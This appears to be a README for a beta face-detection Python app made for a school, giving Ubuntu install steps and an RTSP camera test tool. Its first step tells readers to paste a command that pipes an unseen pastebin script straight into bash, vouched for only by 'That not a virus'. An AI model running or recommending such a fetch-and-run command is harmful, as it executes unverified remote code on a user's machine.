# Face Detect App/Script Beta 
Created for Bakhakats Educational School a.k.a. ( Real School Goris )

FOR LINUX ( Ubuntu default )


| Minimum Requirements for test |
- Python3.10
- Ubuntu 24.10+
- And have enough space to install scripts.
- Tested on the SmartNet Camera V380 model.Q16S-1


| Does work with Python 3.9- |
---------------------------------

# Copy this script , and paste in the terminal , and press enter
- ` curl -s https://pastebin.com/raw/0XdmpDkm | bash `
- That Python3.10 install script ( That not a virus ) 


----------------------
|Installation and Run|
----------------------

Open Terminal  ( ctrl + alt + t ) , and type this command

1. Install required libs
  - ` sudo apt install build-essential cmake libopenblas-dev liblapack-dev libx11-dev libgtk-3-dev `
 

2. Write this command on terminal
  - ` git clone https://github.com/Ordyan777/Face_Detect_App `

3. Now go to cloned directory and run venv
   - ` cd Face_Detect_App `
   - ` python3.10 -m venv .venv310 `
   - ` source .venv310/bin/activate `
   - If You Using Fish , Try This Command - ` source .venv310/bin/activate.fish `

5. Use This Command - `  pip3.10 install -r requirements.txt `

6. For a test write
   - ` python3.10 venv_test.py `

7. If venv_test.py working , write ` face_detect.py *and select photo* `

---==== Multitool for RTSP Camera ===---


For a test write ` python3.10 tools.py ` and check your camera 
